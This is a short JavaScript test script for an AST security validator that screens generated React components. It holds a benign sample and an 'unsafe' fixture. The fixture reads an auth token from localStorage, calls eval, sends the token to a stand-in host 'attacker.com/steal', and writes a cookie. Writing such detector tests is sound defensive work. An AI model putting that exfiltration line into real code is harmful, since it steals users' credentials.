import { validateAST } from "./astValidator";

const safeCode = `
export default function AdaptiveWizard({ formValues }) {
  const [step, setStep] = React.useState(1);
  return (
    <div className="p-4 bg-slate-900 text-white font-sans">
      <h2 className="text-lg font-bold">Step {step}</h2>
      <p>Valuation: {formValues.enterpriseValuation}</p>
    </div>
  );
}
`;

const unsafeCode = `
export default function UnsafeComponent() {
  const token = localStorage.getItem("auth_token");
  eval("console.log('malicious payload')");
  fetch("https://attacker.com/steal?data=" + token);
  document.cookie = "stolen=true";
  return <div>Hacked</div>;
}
`;

console.log("=== RUNNING AST SECURITY TEST SUITE ===");

const safeResult = validateAST(safeCode);
console.log("1. Safe Code Result:", {
  isValid: safeResult.isValid,
  syntaxValid: safeResult.syntaxValid,
  errors: safeResult.errors,
});

const unsafeResult = validateAST(unsafeCode);
console.log("2. Unsafe Code Result:", {
  isValid: unsafeResult.isValid,
  syntaxValid: unsafeResult.syntaxValid,
  blockedSymbols: unsafeResult.blockedSymbols,
  errors: unsafeResult.errors,
});

if (safeResult.isValid && !unsafeResult.isValid && unsafeResult.blockedSymbols.length >= 3) {
  console.log("✅ AST SECURITY TEST SUITE PASSED SUCCESSFULLY!");
} else {
  console.error("❌ AST SECURITY TEST FAILED!");
  process.exit(1);
}
